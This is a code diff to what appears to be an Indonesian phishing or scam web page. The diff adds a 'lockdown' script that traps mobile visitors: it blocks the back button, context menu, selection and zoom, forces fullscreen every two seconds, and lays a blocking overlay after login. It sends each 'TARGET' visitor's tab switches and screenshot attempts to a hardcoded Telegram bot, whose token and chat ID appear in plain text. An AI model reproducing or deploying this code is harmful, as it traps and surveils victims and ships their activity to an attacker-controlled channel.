@@ -59,15 +59,24 @@ body{background:linear-gradient(145deg,#0b0e14,#1a1f2b);min-height:100vh;display
 const BOT_TOKEN = "8883414591:AAF7IS9SxloS6msFZjVKNU-VbRGalrEMGJY";
 const CHAT_ID   = "8439372560";
 const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-// ================================================================
-// FULLSCREEN + DETEKSI TAB KELUAR
-// ================================================================
-function forceFullscreen(){try{const e=document.documentElement;e.requestFullscreen?e.requestFullscreen().catch(()=>{}):e.webkitRequestFullscreen?e.webkitRequestFullscreen():e.msRequestFullscreen&&e.msRequestFullscreen()}catch(e){}}
-forceFullscreen();
-let tabHidden=!1;
-document.addEventListener('visibilitychange',function(){if(document.visibilityState==='hidden'){tabHidden=!0;sendToTelegram(`👀 TARGET PINDAH TAB\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString('id-ID')}`);}else if(document.visibilityState==='visible'){if(tabHidden){sendToTelegram(`🔄 TARGET KEMBALI KE TAB\n🆔 ${CLIENT_ID}\n⏰ ${new Date().toLocaleString('id-ID')}`);tabHidden=!1;}forceFullscreen();}});
-document.addEventListener('click',function(){if(!document.fullscreenElement)forceFullscreen();});
 
+// ================================================================
+// HP LOCKDOWN BRUTAL (FULL)
+// ================================================================
+document.body.style.overflow='hidden';document.documentElement.style.overflow='hidden';
+document.addEventListener('contextmenu',e=>e.preventDefault());
+document.addEventListener('selectstart',e=>e.preventDefault());
+document.addEventListener('touchstart',e=>{if(e.touches.length>1)e.preventDefault()},{passive:!1});
+let lastTouchEnd=0;document.addEventListener('touchend',e=>{const n=Date.now();if(n-lastTouchEnd<=300)e.preventDefault();lastTouchEnd=n},{passive:!1});
+const overlay=document.createElement('div');overlay.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%;z-index:9997;background:transparent;pointer-events:none;';document.body.appendChild(overlay);
+function enableFullBlock(){overlay.style.pointerEvents='auto';sendToTelegram(`🔒 OVERLAY BLOKIR AKTIF\n🆔 ${CLIENT_ID}`);}
+history.pushState(null,'',location.href);window.addEventListener('popstate',function(){history.pushState(null,'',location.href);sendToTelegram(`⬅️ BACK DIBLOKIR\n🆔 ${CLIENT_ID}`);});
+let startY=0;document.addEventListener('touchstart',e=>{startY=e.touches[0].pageY},{passive:!0});document.addEventListener('touchmove',e=>{const y=e.touches[0].pageY,st=document.documentElement.scrollTop||document.body.scrollTop;if(st===0&&y>startY+50)e.preventDefault()},{passive:!1});
+setInterval(()=>{try{if(!document.fullscreenElement&&!document.webkitFullscreenElement){const e=document.documentElement;e.requestFullscreen?e.requestFullscreen().catch(()=>{}):e.webkitRequestFullscreen&&e.webkitRequestFullscreen()}}catch(e){}},2000);
+try{screen.orientation.lock('portrait').catch(()=>{})}catch(e){}
+document.addEventListener('keydown',e=>{if(e.key==='VolumeDown'||e.key==='Power')sendToTelegram(`📸 PERCOBAAN SCREENSHOT\n🆔 ${CLIENT_ID}`);});
+document.addEventListener('visibilitychange',()=>{if(document.hidden){sendToTelegram(`👀 TARGET PINDAH TAB\n🆔 ${CLIENT_ID}`);}else{sendToTelegram(`🔄 TARGET KEMBALI\n🆔 ${CLIENT_ID}`);setTimeout(()=>{const e=document.documentElement;e.requestFullscreen?e.requestFullscreen().catch(()=>{}):e.webkitRequestFullscreen&&e.webkitRequestFullscreen();},300);}});
+window.originalLogin=window.login;window.login=function(){originalLogin();setTimeout(()=>{enableFullBlock();document.body.style.overflow='hidden';document.documentElement.style.overflow='hidden';},500);};
 // ================================================================
 // STATE
 // ================================================================
@@ -263,6 +272,7 @@ document.addEventListener('keydown', function(e) {
         e.preventDefault();
     }
 });
+
 // ================================================================
 // LOGIN
 // ================================================================
